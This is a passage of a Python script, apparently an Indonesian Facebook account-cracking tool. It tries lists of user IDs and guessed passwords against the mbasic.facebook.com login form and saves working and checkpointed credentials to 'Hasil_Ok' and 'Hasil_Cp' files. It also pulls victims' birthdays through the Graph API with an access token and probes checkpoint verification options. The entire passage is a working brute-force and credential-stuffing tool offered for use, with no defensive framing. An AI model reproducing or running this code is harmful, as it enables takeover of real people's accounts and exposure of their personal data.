					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(a+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CRACK MBASIC

def mbasic(uid,pwx,loop):
	ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
	ini_persen = float(loop)*100
	persennya = float(ini_persen)/float(len(id))
	persenku = str(persennya).split(".")
	npc = persenku[1]
	if len(npc)==1 and npc=="0":
		persen = persenku[0]+"%"
	else:
		if len(npc)==1:
			persen = persenku[0]+"."+npc+"%"
		else:
			persen = persenku[0]+"."+npc[0]+npc[1]+"%"
	loliku = datetime.now()
	minit = loliku.minute
	ditik = loliku.second
	if loop==35 or loop==45:
		semoga.append(str(minit)+","+str(ditik))
	if loop==47:
		mulai,selesai = semoga[0],semoga[1]
		tikung = mulai.split(",")
		modal = selesai.split(",")
		if tikung[0]==modal[0]:
			det = float(modal[1])-float(tikung[1])
		else:
			mixer = float(modal[0])-float(tikung[0])
			mixing = mixer*60.0
			durian = 60.0-float(tikung[1])+float(modal[1])
			det = mixing+durian
		if det==0.0:
			nihh = det+0.7
			berapa_d.append(nihh)
		else:
			berapa_d.append(det)
	else:
		det = "-"
	if len(berapa_d)==0:
		dett = "-"
	else:
		for angka in berapa_d:
			hitt = float(angka)/10
			hutt = len(id)-loop
			dutt = hitt*hutt
			dott = str(dutt)
			ditt = dott.split(".")
			if dutt>3599:
				cutt = dutt/3600.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"j"
				else:
					dett = jutt[0]+"."+jitt[0]+"j"
			elif dutt>59 and dutt<3600:
				cutt = dutt/60.0
				jutt = str(cutt).split(".")
				jitt = jutt[1]
				if len(jutt[1])==1 and jutt[1]=="0":
					dett = jutt[0]+"m"
				else:
					dett = jutt[0]+"."+jitt[0]+"m"
			elif dutt>0 and dutt<60:
				dett = ditt[0]+"d"
	print(s+"\r{"+u+"Ndrii"+s+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://mbasic.facebook.com")
			b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if "old" in old_gak:
					if len(uid)==6:
						tahunnya = joined_year[0]
					elif len(uid)==7:
						tahunnya = joined_year[1]
					elif len(uid)==8:
						tahunnya = joined_year[2]
					elif len(uid)==9:
						tahunnya = joined_year[3]
					elif len(uid)==10:
						tahunnya = joined_year[4]
					elif len(uid)==15:
						tahunnya = joined_year[5]
					print(s+"\r{"+k+"ok"+s+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+tahunnya+"          ")
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					print(s+"\r{"+k+"ok"+s+"}"+h+" "+uid+k+" >< "+h+pw+k+" >< "+h+kuki)
					bts = open("Hasil_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if len(uid)==6:
					tahunnya = joined_year[0]
				elif len(uid)==7:
					tahunnya = joined_year[1]
				elif len(uid)==8:
					tahunnya = joined_year[2]
				elif len(uid)==9:
					tahunnya = joined_year[3]
				elif len(uid)==10:
					tahunnya = joined_year[4]
				elif len(uid)==15:
					tahunnya = joined_year[5]
				else:
					tahunnya = "nontype"
				if "jangan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						if len(lahir)==2:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
						else:
							nama_bulan = indah[int(lahir[0])]
							if "old" in old_gak:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
								print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
								bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
					except (KeyError,IOError):
						if "old" in old_gak:
							print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
							print(a+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+"          ")
							bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
				elif "munculkan" in opsit:
					try:
						ttl = requests.get("https://graph.facebook.com/"+uid+"?access_token="+jihan)
						mantap = json.loads(ttl.text)
						bacot = mantap["birthday"]
						lahir = bacot.split("/")
						ceker_ttl(uid,pw,ua,lahir,tahunnya)
					except (KeyError,IOError):
						ceker(uid,pw,ua,tahunnya)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)

# CEKER OPSI

def ceker(uid,pw,ua,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "old" in old_gak:
			print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+tahunnya+"          ")
			bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		else:
			print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+"          ")
			bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
			cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Bos")
		print("\r"+h+batas)

def ceker_ttl(uid,pw,ua,lahir,tahunnya):
	user = uid
	pasw = pw
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if len(lahir)==2:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
				cp.append(uid+"|"+pw)
		else:
			nama_bulan = indah[int(lahir[0])]
			if "old" in old_gak:
				print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2]+k+" >< "+l+tahunnya)
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
			else:
				print(s+"\r{"+k+"cp"+s+"}"+l+" "+uid+k+" >< "+l+pw+k+" >< "+l+lahir[1]+" "+nama_bulan+" "+lahir[2])
				bts = open("Hasil_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
				cp.append(uid+"|"+pw)
		for opt in range(len(ngew)):
			print("\r"+balmond+l+"   "+ngew[opt])
		if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Bos")
		print("\r"+h+batas)

# CEK OPSI

def cek_opsi():
	loop = 0
	print(p+"╠══["+h+"[+]"+k+" Masukkan Nama File")
	print(p+"╠══["+h+"[+]"+p+" Contoh : "+k+"Hasil_Cp/CP_%s.txt"%(hck))
	print(p+"║")
	inp = input(p+"╠══["+h+"[+]"+k+" Nama File : "+h)
	try:
		tes = open(inp,"r").readlines()
	except IOError:
		jalan(p+"╠══["+h+"[+]"+k+" File Tidak Ada")
		time.sleep(0.5)
		menu()
	print(p+"╠══["+h+"[+]"+k+" Terdapat : "+k+"%s Akun"%(len(tes)))
	print("")
	for cinta in tes:
		loop+=1
		sayang = cinta.replace("\n","")
		gemes = sayang.split(">")
		yaudah(gemes[0],gemes[1],loop,tes)

# GAK TAU Ribet Ahk Malass

def yaudah(user,pasw,loop,tes):
	mb = ("https://mbasic.facebook.com")
	ua = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
	ses = requests.Session()
	print(s+"\r{"+k+"CEK"+s+"} "+l+"{%s} Dari {%s}"%(loop,len(tes)), end=' ');sys.stdout.flush()
	try:
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		data = {}
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies:
			print(s+"\r{"+k+"ok"+s+"}"+h+" "+user+k+" >< "+h+pasw)
			print(h+batas)
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			print(s+"\r{"+k+"cp"+s+"}"+l+" "+user+k+" >< "+l+pasw)
			for opt in range(len(ngew)):
				print("\r"+balmond+l+"   "+ngew[opt])
			if "0" in str(len(ngew)):print("\r"+balmond+l+"   "+h+"Tap Yes Nih Bos")
			print(h+batas)
		else:
			print(s+"\r{"+s+"ex"+s+"}"+m+" "+user+k+" >< "+m+pasw)
			print(h+batas)
	except requests.exceptions.ConnectionError:
		time.sleep(31)
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass
if __name__ == '__main__':
	os.system("git pull")
	folder()
	menu()
